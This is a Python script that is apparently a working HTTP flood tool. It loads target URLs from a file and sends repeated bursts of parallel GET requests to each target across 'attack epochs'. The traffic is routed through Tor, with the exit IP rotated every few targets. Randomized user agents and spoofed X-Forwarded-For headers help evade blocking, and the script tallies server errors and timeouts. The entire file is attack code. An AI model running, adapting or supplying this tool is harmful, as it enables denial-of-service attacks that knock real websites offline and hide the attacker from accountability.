import asyncio
import json
import os
import random
import threading
import time
import traceback
from threading import Thread
from typing import Dict, Any, List, Tuple
import aiohttp.client_exceptions
import requests
import concurrent.futures
from itertools import repeat
from aiohttp import ClientSession
from tekleo_common_utils import UtilsRandom
from stem import Signal
from stem.control import Controller



utils_random = UtilsRandom()


HTTP_STATUS_CODE_SUCCESS = 200
HTTP_STATUS_CODE_UNAUTHORIZED = 401
HTTP_STATUS_CODE_FORBIDDEN = 403
HTTP_STATUS_CODE_NOT_FOUND = 404
HTTP_STATUS_CODE_METHOD_NOT_ALLOWED = 405
HTTP_STATUS_CODE_PROXY_AUTHENTICATION_REQUIRED = 407
HTTP_STATUS_CODE_TOO_MANY_REQUESTS = 429
HTTP_STATUS_CODE_INTERNAL_SERVER_ERROR = 500
HTTP_STATUS_CODE_BAD_GATEWAY = 502
HTTP_STATUS_CODE_SERVICE_UNAVAILABLE = 503
HTTP_STATUS_CODE_EXCEPTION_CONNECTION_TIMEOUT = -1000
HTTP_STATUS_CODE_EXCEPTION_PROXY_ERROR = -2000
HTTP_STATUS_CODE_EXCEPTION_SSL_ERROR = -3000
HTTP_STATUS_CODE_EXCEPTION_CONNECTION_ERROR = -4000
HTTP_STATUS_CODE_EXCEPTION_READ_TIMEOUT = -5000
HTTP_STATUS_CODE_EXCEPTION_TOO_MANY_REDIRECTS = -6000
HTTP_STATUS_CODE_EXCEPTION_TIMEOUT = -7000
HTTP_STATUS_CODE_EXCEPTION_SERVER_DISCONNECTED_ERROR = -8000
HTTP_STATUS_CODE_EXCEPTION_CLIENT_OS_ERROR = -9000


TOR_CHANGE_IP_LOCK = threading.Lock()


async def http_get_with_aiohttp(session: ClientSession, url: str, headers: Dict = {}, proxy: str = None, timeout: int = 10, ignore_json: bool = False, ignore_body: bool = False) -> (int, Dict[str, Any], bytes):
    # Make request
    try:
        response = await session.get(url=url, headers=headers, proxy=proxy, timeout=timeout)
    except asyncio.exceptions.TimeoutError as e1:
        return (HTTP_STATUS_CODE_EXCEPTION_TIMEOUT, None, None)
    except aiohttp.client_exceptions.ClientHttpProxyError as e2:
        return (HTTP_STATUS_CODE_EXCEPTION_PROXY_ERROR, None, None)
    except aiohttp.client_exceptions.ClientConnectorError as e3:
        return (HTTP_STATUS_CODE_EXCEPTION_CONNECTION_ERROR, None, None)
    except aiohttp.client_exceptions.ServerDisconnectedError as e4:
        return (HTTP_STATUS_CODE_EXCEPTION_SERVER_DISCONNECTED_ERROR, None, None)
    except aiohttp.client_exceptions.ClientOSError as e5:
        return (HTTP_STATUS_CODE_EXCEPTION_CLIENT_OS_ERROR, None, None)
    except Exception as e3:
        print(traceback.format_exc())
        return (0, None, None)

    # Read JSON
    response_json = None
    if not ignore_json:
        try:
            response_json = await response.json(content_type=None)
        except json.decoder.JSONDecodeError as e:
            pass

    # Read BODY
    response_content = None
    if not ignore_body:
        try:
            response_content = await response.read()
        except:
            pass

    return (response.status, response_json, response_content)


async def http_get_with_aiohttp_parallel(session: ClientSession, list_of_urls: List[str], headers: Dict = {}, proxy: str = None, timeout: int = 10, ignore_json: bool = False, ignore_body: bool = False) -> (List[Tuple[int, Dict[str, Any], bytes]], float):
    t1 = time.time()
    results = await asyncio.gather(*[http_get_with_aiohttp(session, url, headers, proxy, timeout, ignore_json, ignore_body) for url in list_of_urls])
    t2 = time.time()
    t = t2 - t1
    return results, t


def debug_stats(url: str, results: List[Tuple[int, Dict[str, Any], bytes]], t: float):
    print('debug_stats(): ----------------------- ')
    print('debug_stats(): ' + url)
    success_responses = len([r for r in results if 200 <= r[0] <= 299])
    redirect_responses = len([r for r in results if 300 <= r[0] <= 399])
    client_error_responses = len([r for r in results if 400 <= r[0] <= 499])
    not_found_responses = len([r for r in results if r[0] == HTTP_STATUS_CODE_NOT_FOUND])
    method_not_allowed_responses = len([r for r in results if r[0] == HTTP_STATUS_CODE_METHOD_NOT_ALLOWED])
    server_error_responses = len([r for r in results if 500 <= r[0] <= 599])
    connection_timeouts = len([r for r in results if r[0] == HTTP_STATUS_CODE_EXCEPTION_CONNECTION_TIMEOUT])
    proxy_errors = len([r for r in results if r[0] == HTTP_STATUS_CODE_EXCEPTION_PROXY_ERROR])
    ssl_errors = len([r for r in results if r[0] == HTTP_STATUS_CODE_EXCEPTION_SSL_ERROR])
    connection_errors = len([r for r in results if r[0] == HTTP_STATUS_CODE_EXCEPTION_CONNECTION_ERROR])
    read_timeouts = len([r for r in results if r[0] == HTTP_STATUS_CODE_EXCEPTION_READ_TIMEOUT])
    too_many_redirects = len([r for r in results if r[0] == HTTP_STATUS_CODE_EXCEPTION_TOO_MANY_REDIRECTS])
    timeouts = len([r for r in results if r[0] == HTTP_STATUS_CODE_EXCEPTION_TIMEOUT])
    server_disconnected_error = len([r for r in results if r[0] == HTTP_STATUS_CODE_EXCEPTION_SERVER_DISCONNECTED_ERROR])
    client_os_error = len([r for r in results if r[0] == HTTP_STATUS_CODE_EXCEPTION_CLIENT_OS_ERROR])

    print('debug_stats(): Total responses count: ' + str(len(results)))
    if success_responses > 0:
        print('debug_stats(): Success responses: ' + str(success_responses))
    if redirect_responses > 0:
        print('debug_stats(): Redirect responses: ' + str(redirect_responses))

    if client_error_responses > 0:
        print('debug_stats(): Client error responses (4XX): ' + str(client_error_responses))
    if not_found_responses > 0:
        print('debug_stats(): Not found responses (' + str(HTTP_STATUS_CODE_NOT_FOUND) + '): ' + str(not_found_responses))
    if method_not_allowed_responses > 0:
        print('debug_stats(): Method not allowed responses (' + str(HTTP_STATUS_CODE_METHOD_NOT_ALLOWED) + '): ' + str(method_not_allowed_responses))

    if server_error_responses > 0:
        print('debug_stats(): Server error responses (5XX): ' + str(server_error_responses))

    if connection_timeouts > 0:
        print('debug_stats(): Connection timeouts (by client): ' + str(connection_timeouts))
    if proxy_errors > 0:
        print('debug_stats(): Proxy errors (by client): ' + str(proxy_errors))
    if ssl_errors > 0:
        print('debug_stats(): SSL errors (by client): ' + str(ssl_errors))
    if connection_errors > 0:
        print('debug_stats(): Connections errors (by client): ' + str(connection_errors))
    if read_timeouts > 0:
        print('debug_stats(): Read timeouts (by client): ' + str(read_timeouts))
    if too_many_redirects > 0:
        print('debug_stats(): Too many redirects (by client): ' + str(too_many_redirects))
    if timeouts > 0:
        print('debug_stats(): Timeouts (by client): ' + str(timeouts))
    if server_disconnected_error > 0:
        print('debug_stats(): Server disconnected (by client): ' + str(server_disconnected_error))
    if client_os_error > 0:
        print('debug_stats(): Client OS error (by client): ' + str(client_os_error))

    print('debug_stats(): Execution time is ' + str(round(t, 2)) + ' s,' + ' speed is ' + str(round(len(results) / t, 2)) + ' r/s')
    print('debug_stats(): ')



# TOR helpers
#-----------------------------------------------------------------------------------------------------------------------
def change_ip_tor():
    with TOR_CHANGE_IP_LOCK:
        time.sleep(1)
        with Controller.from_port(port=9051) as controller:
            controller.authenticate(password='my password')
            controller.signal(Signal.NEWNYM)
        print("switch_tor_ip(): Generated new IP")
        time.sleep(1)

async def check_my_ip_with_tor(session: ClientSession) -> (int, Dict[str, Any], bytes):
    result = await http_get_with_aiohttp(session, 'https://api.myip.com/', proxy="http://127.0.0.1:8118")
    print("check_my_ip_with_tor(): Your current TOR IP address: " + str(result))
    return result
#-----------------------------------------------------------------------------------------------------------------------


# Load configuration
NUMBER_OF_EPOCHS = int(os.environ['NUMBER_OF_EPOCHS'])
PARALLEL_SINGLE_URL_MIN_REQUESTS = int(os.environ['PARALLEL_SINGLE_URL_MIN_REQUESTS'])
PARALLEL_SINGLE_URL_MAX_REQUESTS = int(os.environ['PARALLEL_SINGLE_URL_MAX_REQUESTS'])

# Load targets
LIST_OF_URLS = []
with open('targets.txt') as f:
    lines = f.readlines()
    lines = [l.strip() for l in lines]
    lines = [l for l in lines if len(l) > 0]
    LIST_OF_URLS.extend(lines)

# Load randomized headers
LIST_OF_HEADERS = [
    {
        'User-Agent': utils_random.get_random_user_agent(),
        'X-Forwarded-For': utils_random.get_random_ip(),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'en-us,en;q=0.5',
        'Accept-Encoding': 'gzip,deflate',
        'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.7',
        'Keep-Alive': '115',
        'Connection': 'keep-alive',
    }
    for i in range(0, 100)
]



async def epoch(epoch_number: int):
    print('\n\n------- Attack Epoch #' + str(epoch_number) + ' -------')

    # Open session
    session = ClientSession()

    # Randomize links
    random.shuffle(LIST_OF_HEADERS)

    # For each target
    for i in range(0, len(LIST_OF_URLS)):
        # Get URL
        target_url = LIST_OF_URLS[i]

        # If needed - change IP
        if i % 4 == 0:
            change_ip_tor()
            await check_my_ip_with_tor(session)

        # Gen headers and proxy
        headers = random.choice(LIST_OF_HEADERS)
        proxy = "http://127.0.0.1:8118"

        # Determine how many requests we need to make
        number_of_requests = random.randint(PARALLEL_SINGLE_URL_MIN_REQUESTS, PARALLEL_SINGLE_URL_MAX_REQUESTS)

        # Generate URLs
        current_target_urls = [target_url for i in range(0, number_of_requests)]

        # Run requests
        results, t = await http_get_with_aiohttp_parallel(session, current_target_urls, headers=headers, proxy=proxy, ignore_json=True, ignore_body=True)
        debug_stats(target_url, results, t)

    # Close session
    await session.close()


async def main():
    for i in range(0, NUMBER_OF_EPOCHS):
        await epoch(i)


asyncio.run(main())
